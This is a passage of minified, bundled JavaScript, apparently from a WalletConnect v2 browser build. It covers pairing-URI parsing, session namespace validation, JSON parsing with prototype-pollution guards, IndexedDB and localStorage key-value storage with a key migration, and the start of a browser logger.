r.senderPublicKey<"u"?Kr(r.senderPublicKey,kr):void 0,receiverPublicKey:e==null?void 0:e.receiverPublicKey})}function PC(t){const e=(t==null?void 0:t.type)||AC;if(e===Ls){if(typeof(t==null?void 0:t.senderPublicKey)>"u")throw new Error("missing sender public key");if(typeof(t==null?void 0:t.receiverPublicKey)>"u")throw new Error("missing receiver public key")}return{type:e,senderPublicKey:t==null?void 0:t.senderPublicKey,receiverPublicKey:t==null?void 0:t.receiverPublicKey}}function _3(t){return t.type===Ls&&typeof t.senderPublicKey=="string"&&typeof t.receiverPublicKey=="string"}function T3(t){return t.type===Wf}function m$(t){const e=Buffer.from(t.x,"base64"),r=Buffer.from(t.y,"base64");return bd([new Uint8Array([4]),e,r])}function y$(t,e){const[r,n,i]=t.split("."),s=Buffer.from(SC(i),"base64");if(s.length!==64)throw new Error("Invalid signature length");const o=s.slice(0,32),a=s.slice(32,64),c=`${r}.${n}`,l=Hf(c),u=m$(e);if(!c$.verify(bd([o,a]),l,u))throw new Error("Invalid signature");return Km(t).payload}const b$="irn";function X0(t){return(t==null?void 0:t.relay)||{protocol:b$}}function od(t){const e=xO[t];if(typeof e>"u")throw new Error(`Relay Protocol not supported: ${t}`);return e}function v$(t,e="-"){const r={},n="relay"+e;return Object.keys(t).forEach(i=>{if(i.startsWith(n)){const s=i.replace(n,""),o=t[i];r[s]=o}}),r}function $3(t){if(!t.includes("wc:")){const l=JE(t);l!=null&&l.includes("wc:")&&(t=l)}t=t.includes("wc://")?t.replace("wc://",""):t,t=t.includes("wc:")?t.replace("wc:",""):t;const e=t.indexOf(":"),r=t.indexOf("?")!==-1?t.indexOf("?"):void 0,n=t.substring(0,e),i=t.substring(e+1,r).split("@"),s=typeof r<"u"?t.substring(r):"",o=new URLSearchParams(s),a={};o.forEach((l,u)=>{a[u]=l});const c=typeof a.methods=="string"?a.methods.split(","):void 0;return{protocol:n,topic:E$(i[0]),version:parseInt(i[1],10),symKey:a.symKey,relay:v$(a),methods:c,expiryTimestamp:a.expiryTimestamp?parseInt(a.expiryTimestamp,10):void 0}}function E$(t){return t.startsWith("//")?t.substring(2):t}function C$(t,e="-"){const r="relay",n={};return Object.keys(t).forEach(i=>{const s=i,o=r+e+s;t[s]&&(n[o]=t[s])}),n}function R3(t){const e=new URLSearchParams,r=C$(t.relay);Object.keys(r).sort().forEach(i=>{e.set(i,r[i])}),e.set("symKey",t.symKey),t.expiryTimestamp&&e.set("expiryTimestamp",t.expiryTimestamp.toString()),t.methods&&e.set("methods",t.methods.join(","));const n=e.toString();return`${t.protocol}:${t.topic}@${t.version}?${n}`}function vp(t,e,r){return`${t}?wc_ev=${r}&topic=${e}`}function hh(t){const e=[];return t.forEach(r=>{const[n,i]=r.split(":");e.push(`${n}:${i}`)}),e}function A$(t){const e=[];return Object.values(t).forEach(r=>{e.push(...hh(r.accounts))}),e}function x$(t,e){const r=[];return Object.values(t).forEach(n=>{hh(n.accounts).includes(e)&&r.push(...n.methods)}),r}function I$(t,e){const r=[];return Object.values(t).forEach(n=>{hh(n.accounts).includes(e)&&r.push(...n.events)}),r}function Gb(t){return t.includes(":")}function ad(t){return Gb(t)?t.split(":")[0]:t}function S$(t){const e={};return t==null||t.forEach(r=>{var n;const[i,s]=r.split(":");e[i]||(e[i]={accounts:[],chains:[],events:[],methods:[]}),e[i].accounts.push(r),(n=e[i].chains)==null||n.push(`${i}:${s}`)}),e}function D3(t,e){e=e.map(n=>n.replace("did:pkh:",""));const r=S$(e);for(const[n,i]of Object.entries(r))i.methods?i.methods=k0(i.methods,t):i.methods=t,i.events=["chainChanged","accountsChanged"];return r}const N$={INVALID_METHOD:{message:"Invalid method.",code:1001},INVALID_EVENT:{message:"Invalid event.",code:1002},INVALID_UPDATE_REQUEST:{message:"Invalid update request.",code:1003},INVALID_EXTEND_REQUEST:{message:"Invalid extend request.",code:1004},INVALID_SESSION_SETTLE_REQUEST:{message:"Invalid session settle request.",code:1005},UNAUTHORIZED_METHOD:{message:"Unauthorized method.",code:3001},UNAUTHORIZED_EVENT:{message:"Unauthorized event.",code:3002},UNAUTHORIZED_UPDATE_REQUEST:{message:"Unauthorized update request.",code:3003},UNAUTHORIZED_EXTEND_REQUEST:{message:"Unauthorized extend request.",code:3004},USER_REJECTED:{message:"User rejected.",code:5e3},USER_REJECTED_CHAINS:{message:"User rejected chains.",code:5001},USER_REJECTED_METHODS:{message:"User rejected methods.",code:5002},USER_REJECTED_EVENTS:{message:"User rejected events.",code:5003},UNSUPPORTED_CHAINS:{message:"Unsupported chains.",code:5100},UNSUPPORTED_METHODS:{message:"Unsupported methods.",code:5101},UNSUPPORTED_EVENTS:{message:"Unsupported events.",code:5102},UNSUPPORTED_ACCOUNTS:{message:"Unsupported accounts.",code:5103},UNSUPPORTED_NAMESPACE_KEY:{message:"Unsupported namespace key.",code:5104},USER_DISCONNECTED:{message:"User disconnected.",code:6e3},SESSION_SETTLEMENT_FAILED:{message:"Session settlement failed.",code:7e3},WC_METHOD_UNSUPPORTED:{message:"Unsupported wc_ method.",code:10001}},P$={NOT_INITIALIZED:{message:"Not initialized.",code:1},NO_MATCHING_KEY:{message:"No matching key.",code:2},RESTORE_WILL_OVERRIDE:{message:"Restore will override.",code:3},RESUBSCRIBED:{message:"Resubscribed.",code:4},MISSING_OR_INVALID:{message:"Missing or invalid.",code:5},EXPIRED:{message:"Expired.",code:6},UNKNOWN_TYPE:{message:"Unknown type.",code:7},MISMATCHED_TOPIC:{message:"Mismatched topic.",code:8},NON_CONFORMING_NAMESPACES:{message:"Non conforming namespaces.",code:9}};function ee(t,e){const{message:r,code:n}=P$[t];return{message:e?`${r} ${e}`:r,code:n}}function it(t,e){const{message:r,code:n}=N$[t];return{message:e?`${r} ${e}`:r,code:n}}function hi(t,e){return!!Array.isArray(t)}function Md(t){return Object.getPrototypeOf(t)===Object.prototype&&Object.keys(t).length}function ir(t){return typeof t>"u"}function Tt(t,e){return e&&ir(t)?!0:typeof t=="string"&&!!t.trim().length}function Kb(t,e){return e&&ir(t)?!0:typeof t=="number"&&!isNaN(t)}function k$(t,e){const{requiredNamespaces:r}=e,n=Object.keys(t.namespaces),i=Object.keys(r);let s=!0;return Ta(i,n)?(n.forEach(o=>{const{accounts:a,methods:c,events:l}=t.namespaces[o],u=hh(a),h=r[o];(!Ta(VE(o,h),u)||!Ta(h.methods,c)||!Ta(h.events,l))&&(s=!1)}),s):!1}function eg(t){return Tt(t,!1)&&t.includes(":")?t.split(":").length===2:!1}function O$(t){if(Tt(t,!1)&&t.includes(":")){const e=t.split(":");if(e.length===3){const r=e[0]+":"+e[1];return!!e[2]&&eg(r)}}return!1}function _$(t){function e(r){try{return typeof new URL(r)<"u"}catch{return!1}}try{if(Tt(t,!1)){if(e(t))return!0;const r=JE(t);return e(r)}}catch{}return!1}function T$(t){var e;return(e=t==null?void 0:t.proposer)==null?void 0:e.publicKey}function $$(t){return t==null?void 0:t.topic}function R$(t,e){let r=null;return Tt(t==null?void 0:t.publicKey,!1)||(r=ee("MISSING_OR_INVALID",`${e} controller public key should be a string`)),r}function B3(t){let e=!0;return hi(t)?t.length&&(e=t.every(r=>Tt(r,!1))):e=!1,e}function D$(t,e,r){let n=null;return hi(e)&&e.length?e.forEach(i=>{n||eg(i)||(n=it("UNSUPPORTED_CHAINS",`${r}, chain ${i} should be a string and conform to "namespace:chainId" format`))}):eg(t)||(n=it("UNSUPPORTED_CHAINS",`${r}, chains must be defined as "namespace:chainId" e.g. "eip155:1": {...} in the namespace key OR as an array of CAIP-2 chainIds e.g. eip155: { chains: ["eip155:1", "eip155:5"] }`)),n}function B$(t,e,r){let n=null;return Object.entries(t).forEach(([i,s])=>{if(n)return;const o=D$(i,VE(i,s),`${e} ${r}`);o&&(n=o)}),n}function L$(t,e){let r=null;return hi(t)?t.forEach(n=>{r||O$(n)||(r=it("UNSUPPORTED_ACCOUNTS",`${e}, account ${n} should be a string and conform to "namespace:chainId:address" format`))}):r=it("UNSUPPORTED_ACCOUNTS",`${e}, accounts should be an array of strings conforming to "namespace:chainId:address" format`),r}function U$(t,e){let r=null;return Object.values(t).forEach(n=>{if(r)return;const i=L$(n==null?void 0:n.accounts,`${e} namespace`);i&&(r=i)}),r}function M$(t,e){let r=null;return B3(t==null?void 0:t.methods)?B3(t==null?void 0:t.events)||(r=it("UNSUPPORTED_EVENTS",`${e}, events should be an array of strings or empty array for no events`)):r=it("UNSUPPORTED_METHODS",`${e}, methods should be an array of strings or empty array for no methods`),r}function kC(t,e){let r=null;return Object.values(t).forEach(n=>{if(r)return;const i=M$(n,`${e}, namespace`);i&&(r=i)}),r}function F$(t,e,r){let n=null;if(t&&Md(t)){const i=kC(t,e);i&&(n=i);const s=B$(t,e,r);s&&(n=s)}else n=ee("MISSING_OR_INVALID",`${e}, ${r} should be an object with data`);return n}function iw(t,e){let r=null;if(t&&Md(t)){const n=kC(t,e);n&&(r=n);const i=U$(t,e);i&&(r=i)}else r=ee("MISSING_OR_INVALID",`${e}, namespaces should be an object with data`);return r}function OC(t){return Tt(t.protocol,!0)}function z$(t,e){let r=!1;return t?t&&hi(t)&&t.length&&t.forEach(n=>{r=OC(n)}):r=!0,r}function j$(t){return typeof t=="number"}function Fr(t){return typeof t<"u"&&typeof t!==null}function H$(t){return!(!t||typeof t!="object"||!t.code||!Kb(t.code,!1)||!t.message||!Tt(t.message,!1))}function q$(t){return!(ir(t)||!Tt(t.method,!1))}function V$(t){return!(ir(t)||ir(t.result)&&ir(t.error)||!Kb(t.id,!1)||!Tt(t.jsonrpc,!1))}function W$(t){return!(ir(t)||!Tt(t.name,!1))}function L3(t,e){return!(!eg(e)||!A$(t).includes(e))}function G$(t,e,r){return Tt(r,!1)?x$(t,e).includes(r):!1}function K$(t,e,r){return Tt(r,!1)?I$(t,e).includes(r):!1}function U3(t,e,r){let n=null;const i=Z$(t),s=J$(e),o=Object.keys(i),a=Object.keys(s),c=M3(Object.keys(t)),l=M3(Object.keys(e)),u=c.filter(h=>!l.includes(h));return u.length&&(n=ee("NON_CONFORMING_NAMESPACES",`${r} namespaces keys don't satisfy requiredNamespaces.
      Required: ${u.toString()}
      Received: ${Object.keys(e).toString()}`)),Ta(o,a)||(n=ee("NON_CONFORMING_NAMESPACES",`${r} namespaces chains don't satisfy required namespaces.
      Required: ${o.toString()}
      Approved: ${a.toString()}`)),Object.keys(e).forEach(h=>{if(!h.includes(":")||n)return;const d=hh(e[h].accounts);d.includes(h)||(n=ee("NON_CONFORMING_NAMESPACES",`${r} namespaces accounts don't satisfy namespace accounts for ${h}
        Required: ${h}
        Approved: ${d.toString()}`))}),o.forEach(h=>{n||(Ta(i[h].methods,s[h].methods)?Ta(i[h].events,s[h].events)||(n=ee("NON_CONFORMING_NAMESPACES",`${r} namespaces events don't satisfy namespace events for ${h}`)):n=ee("NON_CONFORMING_NAMESPACES",`${r} namespaces methods don't satisfy namespace methods for ${h}`))}),n}function Z$(t){const e={};return Object.keys(t).forEach(r=>{var n;r.includes(":")?e[r]=t[r]:(n=t[r].chains)==null||n.forEach(i=>{e[i]={methods:t[r].methods,events:t[r].events}})}),e}function M3(t){return[...new Set(t.map(e=>e.includes(":")?e.split(":")[0]:e))]}function J$(t){const e={};return Object.keys(t).forEach(r=>{if(r.includes(":"))e[r]=t[r];else{const n=hh(t[r].accounts);n==null||n.forEach(i=>{e[i]={accounts:t[r].accounts.filter(s=>s.includes(`${i}:`)),methods:t[r].methods,events:t[r].events}})}}),e}function Q$(t,e){return Kb(t,!1)&&t<=e.max&&t>=e.min}function F3(){const t=zf();return new Promise(e=>{switch(t){case gn.browser:e(Y$());break;case gn.reactNative:e(X$());break;case gn.node:e(eR());break;default:e(!0)}})}function Y$(){return Ff()&&(navigator==null?void 0:navigator.onLine)}async function X$(){if(Go()&&typeof global<"u"&&global!=null&&global.NetInfo){const t=await(global==null?void 0:global.NetInfo.fetch());return t==null?void 0:t.isConnected}return!0}function eR(){return!0}function tR(t){switch(zf()){case gn.browser:rR(t);break;case gn.reactNative:nR(t);break}}function rR(t){!Go()&&Ff()&&(window.addEventListener("online",()=>t(!0)),window.addEventListener("offline",()=>t(!1)))}function nR(t){Go()&&typeof global<"u"&&global!=null&&global.NetInfo&&(global==null||global.NetInfo.addEventListener(e=>t(e==null?void 0:e.isConnected)))}const sw={};let Ih=class{static get(e){return sw[e]}static set(e,r){sw[e]=r}static delete(e){delete sw[e]}};class Bc{}let iR=class extends Bc{constructor(e){super()}};const z3=X.FIVE_SECONDS,dh={pulse:"heartbeat_pulse"};let sR=class _C extends iR{constructor(e){super(e),this.events=new mn.EventEmitter,this.interval=z3,this.interval=(e==null?void 0:e.interval)||z3}static async init(e){const r=new _C(e);return await r.init(),r}async init(){await this.initialize()}stop(){clearInterval(this.intervalRef)}on(e,r){this.events.on(e,r)}once(e,r){this.events.once(e,r)}off(e,r){this.events.off(e,r)}removeListener(e,r){this.events.removeListener(e,r)}async initialize(){this.intervalRef=setInterval(()=>this.pulse(),X.toMiliseconds(this.interval))}pulse(){this.events.emit(dh.pulse)}};const oR=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,aR=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,cR=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function lR(t,e){if(t==="__proto__"||t==="constructor"&&e&&typeof e=="object"&&"prototype"in e){uR(t);return}return e}function uR(t){console.warn(`[destr] Dropping "${t}" key to prevent prototype pollution.`)}function Ep(t,e={}){if(typeof t!="string")return t;if(t[0]==='"'&&t[t.length-1]==='"'&&t.indexOf("\\")===-1)return t.slice(1,-1);const r=t.trim();if(r.length<=9)switch(r.toLowerCase()){case"true":return!0;case"false":return!1;case"undefined":return;case"null":return null;case"nan":return Number.NaN;case"infinity":return Number.POSITIVE_INFINITY;case"-infinity":return Number.NEGATIVE_INFINITY}if(!cR.test(t)){if(e.strict)throw new SyntaxError("[destr] Invalid JSON");return t}try{if(oR.test(t)||aR.test(t)){if(e.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(t,lR)}return JSON.parse(t)}catch(n){if(e.strict)throw n;return t}}function hR(t){return!t||typeof t.then!="function"?Promise.resolve(t):t}function jt(t,...e){try{return hR(t(...e))}catch(r){return Promise.reject(r)}}function dR(t){const e=typeof t;return t===null||e!=="object"&&e!=="function"}function fR(t){const e=Object.getPrototypeOf(t);return!e||e.isPrototypeOf(Object)}function T0(t){if(dR(t))return String(t);if(fR(t)||Array.isArray(t))return JSON.stringify(t);if(typeof t.toJSON=="function")return T0(t.toJSON());throw new Error("[unstorage] Cannot stringify value!")}const ay="base64:";function pR(t){return typeof t=="string"?t:ay+mR(t)}function gR(t){return typeof t!="string"||!t.startsWith(ay)?t:wR(t.slice(ay.length))}function wR(t){return globalThis.Buffer?Buffer.from(t,"base64"):Uint8Array.from(globalThis.atob(t),e=>e.codePointAt(0))}function mR(t){return globalThis.Buffer?Buffer.from(t).toString("base64"):globalThis.btoa(String.fromCodePoint(...t))}function Mr(t){var e;return t&&((e=t.split("?")[0])==null?void 0:e.replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,""))||""}function yR(...t){return Mr(t.join(":"))}function Cp(t){return t=Mr(t),t?t+":":""}function bR(t,e){if(e===void 0)return!0;let r=0,n=t.indexOf(":");for(;n>-1;)r++,n=t.indexOf(":",n+1);return r<=e}function vR(t,e){return e?t.startsWith(e)&&t[t.length-1]!=="$":t[t.length-1]!=="$"}const ER="memory",CR=()=>{const t=new Map;return{name:ER,getInstance:()=>t,hasItem(e){return t.has(e)},getItem(e){return t.get(e)??null},getItemRaw(e){return t.get(e)??null},setItem(e,r){t.set(e,r)},setItemRaw(e,r){t.set(e,r)},removeItem(e){t.delete(e)},getKeys(){return[...t.keys()]},clear(){t.clear()},dispose(){t.clear()}}};function AR(t={}){const e={mounts:{"":t.driver||CR()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},r=l=>{for(const u of e.mountpoints)if(l.startsWith(u))return{base:u,relativeKey:l.slice(u.length),driver:e.mounts[u]};return{base:"",relativeKey:l,driver:e.mounts[""]}},n=(l,u)=>e.mountpoints.filter(h=>h.startsWith(l)||u&&l.startsWith(h)).map(h=>({relativeBase:l.length>h.length?l.slice(h.length):void 0,mountpoint:h,driver:e.mounts[h]})),i=(l,u)=>{if(e.watching){u=Mr(u);for(const h of e.watchListeners)h(l,u)}},s=async()=>{if(!e.watching){e.watching=!0;for(const l in e.mounts)e.unwatch[l]=await j3(e.mounts[l],i,l)}},o=async()=>{if(e.watching){for(const l in e.unwatch)await e.unwatch[l]();e.unwatch={},e.watching=!1}},a=(l,u,h)=>{const d=new Map,f=g=>{let p=d.get(g.base);return p||(p={driver:g.driver,base:g.base,items:[]},d.set(g.base,p)),p};for(const g of l){const p=typeof g=="string",w=Mr(p?g:g.key),m=p?void 0:g.value,b=p||!g.options?u:{...u,...g.options},v=r(w);f(v).items.push({key:w,value:m,relativeKey:v.relativeKey,options:b})}return Promise.all([...d.values()].map(g=>h(g))).then(g=>g.flat())},c={hasItem(l,u={}){l=Mr(l);const{relativeKey:h,driver:d}=r(l);return jt(d.hasItem,h,u)},getItem(l,u={}){l=Mr(l);const{relativeKey:h,driver:d}=r(l);return jt(d.getItem,h,u).then(f=>Ep(f))},getItems(l,u={}){return a(l,u,h=>h.driver.getItems?jt(h.driver.getItems,h.items.map(d=>({key:d.relativeKey,options:d.options})),u).then(d=>d.map(f=>({key:yR(h.base,f.key),value:Ep(f.value)}))):Promise.all(h.items.map(d=>jt(h.driver.getItem,d.relativeKey,d.options).then(f=>({key:d.key,value:Ep(f)})))))},getItemRaw(l,u={}){l=Mr(l);const{relativeKey:h,driver:d}=r(l);return d.getItemRaw?jt(d.getItemRaw,h,u):jt(d.getItem,h,u).then(f=>gR(f))},async setItem(l,u,h={}){if(u===void 0)return c.removeItem(l);l=Mr(l);const{relativeKey:d,driver:f}=r(l);f.setItem&&(await jt(f.setItem,d,T0(u),h),f.watch||i("update",l))},async setItems(l,u){await a(l,u,async h=>{if(h.driver.setItems)return jt(h.driver.setItems,h.items.map(d=>({key:d.relativeKey,value:T0(d.value),options:d.options})),u);h.driver.setItem&&await Promise.all(h.items.map(d=>jt(h.driver.setItem,d.relativeKey,T0(d.value),d.options)))})},async setItemRaw(l,u,h={}){if(u===void 0)return c.removeItem(l,h);l=Mr(l);const{relativeKey:d,driver:f}=r(l);if(f.setItemRaw)await jt(f.setItemRaw,d,u,h);else if(f.setItem)await jt(f.setItem,d,pR(u),h);else return;f.watch||i("update",l)},async removeItem(l,u={}){typeof u=="boolean"&&(u={removeMeta:u}),l=Mr(l);const{relativeKey:h,driver:d}=r(l);d.removeItem&&(await jt(d.removeItem,h,u),(u.removeMeta||u.removeMata)&&await jt(d.removeItem,h+"$",u),d.watch||i("remove",l))},async getMeta(l,u={}){typeof u=="boolean"&&(u={nativeOnly:u}),l=Mr(l);const{relativeKey:h,driver:d}=r(l),f=Object.create(null);if(d.getMeta&&Object.assign(f,await jt(d.getMeta,h,u)),!u.nativeOnly){const g=await jt(d.getItem,h+"$",u).then(p=>Ep(p));g&&typeof g=="object"&&(typeof g.atime=="string"&&(g.atime=new Date(g.atime)),typeof g.mtime=="string"&&(g.mtime=new Date(g.mtime)),Object.assign(f,g))}return f},setMeta(l,u,h={}){return this.setItem(l+"$",u,h)},removeMeta(l,u={}){return this.removeItem(l+"$",u)},async getKeys(l,u={}){var w;l=Cp(l);const h=n(l,!0);let d=[];const f=[];let g=!0;for(const m of h){(w=m.driver.flags)!=null&&w.maxDepth||(g=!1);const b=await jt(m.driver.getKeys,m.relativeBase,u);for(const v of b){const x=m.mountpoint+Mr(v);d.some(I=>x.startsWith(I))||f.push(x)}d=[m.mountpoint,...d.filter(v=>!v.startsWith(m.mountpoint))]}const p=u.maxDepth!==void 0&&!g;return f.filter(m=>(!p||bR(m,u.maxDepth))&&vR(m,l))},async clear(l,u={}){l=Cp(l),await Promise.all(n(l,!1).map(async h=>{if(h.driver.clear)return jt(h.driver.clear,h.relativeBase,u);if(h.driver.removeItem){const d=await h.driver.getKeys(h.relativeBase||"",u);return Promise.all(d.map(f=>h.driver.removeItem(f,u)))}}))},async dispose(){await Promise.all(Object.values(e.mounts).map(l=>H3(l)))},async watch(l){return await s(),e.watchListeners.push(l),async()=>{e.watchListeners=e.watchListeners.filter(u=>u!==l),e.watchListeners.length===0&&await o()}},async unwatch(){e.watchListeners=[],await o()},mount(l,u){if(l=Cp(l),l&&e.mounts[l])throw new Error(`already mounted at ${l}`);return l&&(e.mountpoints.push(l),e.mountpoints.sort((h,d)=>d.length-h.length)),e.mounts[l]=u,e.watching&&Promise.resolve(j3(u,i,l)).then(h=>{e.unwatch[l]=h}).catch(console.error),c},async unmount(l,u=!0){var h,d;l=Cp(l),!(!l||!e.mounts[l])&&(e.watching&&l in e.unwatch&&((d=(h=e.unwatch)[l])==null||d.call(h),delete e.unwatch[l]),u&&await H3(e.mounts[l]),e.mountpoints=e.mountpoints.filter(f=>f!==l),delete e.mounts[l])},getMount(l=""){l=Mr(l)+":";const u=r(l);return{driver:u.driver,base:u.base}},getMounts(l="",u={}){return l=Mr(l),n(l,u.parents).map(d=>({driver:d.driver,base:d.mountpoint}))},keys:(l,u={})=>c.getKeys(l,u),get:(l,u={})=>c.getItem(l,u),set:(l,u,h={})=>c.setItem(l,u,h),has:(l,u={})=>c.hasItem(l,u),del:(l,u={})=>c.removeItem(l,u),remove:(l,u={})=>c.removeItem(l,u)};return c}function j3(t,e,r){return t.watch?t.watch((n,i)=>e(n,r+i)):()=>{}}async function H3(t){typeof t.dispose=="function"&&await jt(t.dispose)}function Lc(t){return new Promise((e,r)=>{t.oncomplete=t.onsuccess=()=>e(t.result),t.onabort=t.onerror=()=>r(t.error)})}function TC(t,e){const r=indexedDB.open(t);r.onupgradeneeded=()=>r.result.createObjectStore(e);const n=Lc(r);return(i,s)=>n.then(o=>s(o.transaction(e,i).objectStore(e)))}let ow;function Gf(){return ow||(ow=TC("keyval-store","keyval")),ow}function q3(t,e=Gf()){return e("readonly",r=>Lc(r.get(t)))}function xR(t,e,r=Gf()){return r("readwrite",n=>(n.put(e,t),Lc(n.transaction)))}function IR(t,e=Gf()){return e("readwrite",r=>(r.delete(t),Lc(r.transaction)))}function SR(t=Gf()){return t("readwrite",e=>(e.clear(),Lc(e.transaction)))}function NR(t,e){return t.openCursor().onsuccess=function(){this.result&&(e(this.result),this.result.continue())},Lc(t.transaction)}function PR(t=Gf()){return t("readonly",e=>{if(e.getAllKeys)return Lc(e.getAllKeys());const r=[];return NR(e,n=>r.push(n.key)).then(()=>r)})}const kR="idb-keyval";var OR=(t={})=>{const e=t.base&&t.base.length>0?`${t.base}:`:"",r=i=>e+i;let n;return t.dbName&&t.storeName&&(n=TC(t.dbName,t.storeName)),{name:kR,options:t,async hasItem(i){return!(typeof await q3(r(i),n)>"u")},async getItem(i){return await q3(r(i),n)??null},setItem(i,s){return xR(r(i),s,n)},removeItem(i){return IR(r(i),n)},getKeys(){return PR(n)},clear(){return SR(n)}}};const _R="WALLET_CONNECT_V2_INDEXED_DB",TR="keyvaluestorage";let $R=class{constructor(){this.indexedDb=AR({driver:OR({dbName:_R,storeName:TR})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e=>[e.key,e.value])}async getItem(e){const r=await this.indexedDb.getItem(e);if(r!==null)return r}async setItem(e,r){await this.indexedDb.setItem(e,js(r))}async removeItem(e){await this.indexedDb.removeItem(e)}};var aw=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},$0={exports:{}};(function(){let t;function e(){}t=e,t.prototype.getItem=function(r){return this.hasOwnProperty(r)?String(this[r]):null},t.prototype.setItem=function(r,n){this[r]=String(n)},t.prototype.removeItem=function(r){delete this[r]},t.prototype.clear=function(){const r=this;Object.keys(r).forEach(function(n){r[n]=void 0,delete r[n]})},t.prototype.key=function(r){return r=r||0,Object.keys(this)[r]},t.prototype.__defineGetter__("length",function(){return Object.keys(this).length}),typeof aw<"u"&&aw.localStorage?$0.exports=aw.localStorage:typeof window<"u"&&window.localStorage?$0.exports=window.localStorage:$0.exports=new e})();function RR(t){var e;return[t[0],yc((e=t[1])!=null?e:"")]}let DR=class{constructor(){this.localStorage=$0.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(RR)}async getItem(e){const r=this.localStorage.getItem(e);if(r!==null)return yc(r)}async setItem(e,r){this.localStorage.setItem(e,js(r))}async removeItem(e){this.localStorage.removeItem(e)}};const BR="wc_storage_version",V3=1,LR=async(t,e,r)=>{const n=BR,i=await e.getItem(n);if(i&&i>=V3){r(e);return}const s=await t.getKeys();if(!s.length){r(e);return}const o=[];for(;s.length;){const a=s.shift();if(!a)continue;const c=a.toLowerCase();if(c.includes("wc@")||c.includes("walletconnect")||c.includes("wc_")||c.includes("wallet_connect")){const l=await t.getItem(a);await e.setItem(a,l),o.push(a)}}await e.setItem(n,V3),r(e),UR(t,o)},UR=async(t,e)=>{e.length&&e.forEach(async r=>{await t.removeItem(r)})};let MR=class{constructor(){this.initialized=!1,this.setInitialized=r=>{this.storage=r,this.initialized=!0};const e=new DR;this.storage=e;try{const r=new $R;LR(e,r,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,r){return await this.initialize(),this.storage.setItem(e,r)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise(e=>{const r=setInterval(()=>{this.initialized&&(clearInterval(r),e())},20)})}};var cw,W3;function FR(){if(W3)return cw;W3=1;function t(r){try{return JSON.stringify(r)}catch{return'"[Circular]"'}}cw=e;function e(r,n,i){var s=i&&i.stringify||t,o=1;if(typeof r=="object"&&r!==null){var a=n.length+o;if(a===1)return r;var c=new Array(a);c[0]=s(r);for(var l=1;l<a;l++)c[l]=s(n[l]);return c.join(" ")}if(typeof r!="string")return r;var u=n.length;if(u===0)return r;for(var h="",d=1-o,f=-1,g=r&&r.length||0,p=0;p<g;){if(r.charCodeAt(p)===37&&p+1<g){switch(f=f>-1?f:0,r.charCodeAt(p+1)){case 100:case 102:if(d>=u||n[d]==null)break;f<p&&(h+=r.slice(f,p)),h+=Number(n[d]),f=p+2,p++;break;case 105:if(d>=u||n[d]==null)break;f<p&&(h+=r.slice(f,p)),h+=Math.floor(Number(n[d])),f=p+2,p++;break;case 79:case 111:case 106:if(d>=u||n[d]===void 0)break;f<p&&(h+=r.slice(f,p));var w=typeof n[d];if(w==="string"){h+="'"+n[d]+"'",f=p+2,p++;break}if(w==="function"){h+=n[d].name||"<anonymous>",f=p+2,p++;break}h+=s(n[d]),f=p+2,p++;break;case 115:if(d>=u)break;f<p&&(h+=r.slice(f,p)),h+=String(n[d]),f=p+2,p++;break;case 37:f<p&&(h+=r.slice(f,p)),h+="%",f=p+2,p++,d--;break}++d}++p}return f===-1?r:(f<g&&(h+=r.slice(f)),h)}return cw}var lw,G3;function zR(){if(G3)return lw;G3=1;const t=FR();lw=i;const e=I().console||{},r={mapHttpRequest:g,mapHttpResponse:g,wrapRequestSerializer:p,wrapResponseSerializer:p,wrapErrorSerializer:p,req:g,res:g,err:d};function n(C,N){return Array.isArray(C)?C.filter(function(P){return P!=="!stdSerializers.err"}):C===!0?Object.keys(N):!1}function i(C){C=C||{},C.browser=C.browser||{};const N=C.browser.transmit;if(N&&typeof N.send!="function")throw Error("pino: transmit option must have a send function");const S=C.browser.write||e;C.browser.write&&(C.browser.asObject=!0);const P=C.serializers||{},T=n(C.browser.serialize,P);let D=C.browser.serialize;Array.isArray(C.browser.serialize)&&C.browser.serialize.indexOf("!stdSerializers.err")>-1&&(D=!1);const z=["error","fatal","warn","info","debug","trace"];typeof S=="function"&&(S.error=S.fatal=S.warn=S.info=S.debug=S.trace=S),C.enabled===!1&&(C.level="silent");const V=C.level||"info",O=Object.create(S);O.log||(O.log=w),Object.defineProperty(O,"levelVal",{get:E}),Object.defineProperty(O,"level",{get:k,set:_});const y={transmit:N,serialize:T,asObject:C.browser.asObject,levels:z,timestamp:f(C)};O.levels=i.levels,O.level=V,O.setMaxListeners=O.getMaxListeners=O.emit=O.addListener=O.on=O.prependListener=O.once=O.prependOnceListener=O.removeListener=O.removeAllListeners=O.listeners=O.listenerCount=O.eventNames=O.write=O.flush=w,O.serializers=P,O._serialize=T,O._stdErrSerialize=D,O.child=R,N&&(O._logEvent=h());function E(){return this.level==="silent"?1/0:this.levels.values[this.level]}function k(){return this._level}function _(L){if(L!=="silent"&&!this.levels.values[L])throw Error("unknown level "+L);this._level=L,s(y,O,"error","log"),s(y,O,"fatal","error"),s(y,O,"warn","error"),s(y,O,"info","log"),s(y,O,"debug","log"),s(y,O,"trace","log")}function R(L,q){if(!L)throw new Error("missing bindings for child Pino");q=q||{},T&&L.serializers&&(q.serializers=L.serializers);const W=q.serializers;if(T&&W){var Z=Object.assign({},P,W),G=C.browser.serialize===!0?Object.keys(Z):T;delete 